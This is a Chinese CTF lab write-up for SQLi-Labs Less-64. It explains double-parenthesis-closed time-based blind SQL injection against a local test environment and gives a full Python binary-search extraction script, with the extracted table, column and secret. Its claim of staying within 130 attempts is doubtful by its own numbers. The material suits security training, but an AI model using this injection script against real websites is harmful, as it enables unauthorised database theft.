【SQLi-Labs】Less-64 Challenge-11 双括号时间盲注 Writeup

操作者：何芊宏 | 操作日期：2026.10.29 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 时间盲注, Python自动化, Challenge

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入 Challenge 系列
  • 题目名称：Less-64 (Challenge-11)
  • 提示：目标是从 challenges 库中提取密钥，限制 130 次尝试。无报错、无回显，闭合符为双右括号 ))。

2. 核心原理与前置分析

本关卡与 L62/L63 属于同类型的纯盲注环境。由于源码采用 id=(($id)) 的嵌套结构，上下文变为纯数字型双括号闭合。

继续采用 时间盲注（Time-based Blind SQLi） 配合二分法自动化脚本进行数据提取。在构造 Payload 时，直接使用 )) 闭合原查询，无需添加单引号。使用 if(ascii(substr(...))>mid, sleep(2), 0) 制造时间差，通过测量 HTTP 请求耗时判断字符的 ASCII 码范围。

3. 操作步骤与代码解析

第一步：编写并运行 Python 自动化脚本

在 VS Code 中新建脚本并运行。核心逻辑如下：

import requests
import time

url = "http://localhost/sqli-labs-master/Less-64/"
delay_threshold = 1.5 

def check_true(payload):
    # 核心修改：闭合符变为 ))
    full_url = f"{url}?id=1)) and ({payload})--+"
    try:
        start = time.time()
        requests.get(full_url, timeout=10)
        return (time.time() - start) > delay_threshold
    except requests.exceptions.Timeout:
        return True

def get_char(expr, pos):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"if(ascii(substr({expr},{pos},1))>{mid},sleep(2),0)"
        if check_true(payload):
            low = mid + 1
        else:
            high = mid - 1
    return low

def extract(expr, length):
    result = ""
    for i in range(1, length + 1):
        code = get_char(expr, i)
        if code <= 32 or code > 126:
            break
        result += chr(code)
        print(f"\r[*] 当前结果: {result}", end="", flush=True)
    print()
    return result

if __name__ == "__main__":
    print("[*] 开始 L64 时间盲注二分法提取...")
    table = extract("(select table_name from information_schema.tables where table_schema='challenges' limit 1)", 12)
    print(f"[+] 表名: {table}")
    
    col = extract("(select column_name from information_schema.columns where table_schema='challenges' and column_name like 'secret%' limit 1)", 16)
    print(f"[+] 列名: {col}")
    
    secret = extract(f"(select {col} from challenges.{table} limit 1)", 24)
    print(f"[+] 最终密钥: {secret}")

代码成分解析：

  • full_url = f"{url}?id=1)) and ({payload})--+"：精准匹配 L64 的双括号闭合上下文。
  • time.time() - start > 1.5：设定 1.5 秒的阈值，过滤本地网络延迟抖动，避免造成字符误判。
  • if(ascii(substr(...))>{mid},sleep(2),0)：二分法核心比较逻辑，条件成立时触发 2 秒延时。

第二步：执行结果与提交

终端成功输出：表名 bf6qly8igz，列名 secret_DPIA，最终密钥 6bVMYneTVSy56KKbZneJuaWw。

4. 策略复盘

  • 闭包逃逸的多样性：L63 是单引号，L64 是双括号。需要针对不同结构，在脚本的 URL 构造处进行精准调整，不能盲目套用上一关的闭合逻辑。
  • 脚本的稳定性：二分法配合 1.5 秒阈值，是目前应对纯盲注挑战最稳定的方案。能高效在 130 次限制内完成表名、列名、密钥的三级提取。

5. 知识点总结

  • 双括号闭合盲注：针对嵌套数字型查询的上下文逃逸。
  • 阈值容错：在编写盲注自动化脚本时，合理的网络阈值（大于本地平均延迟）是确保数据准确率的关键。
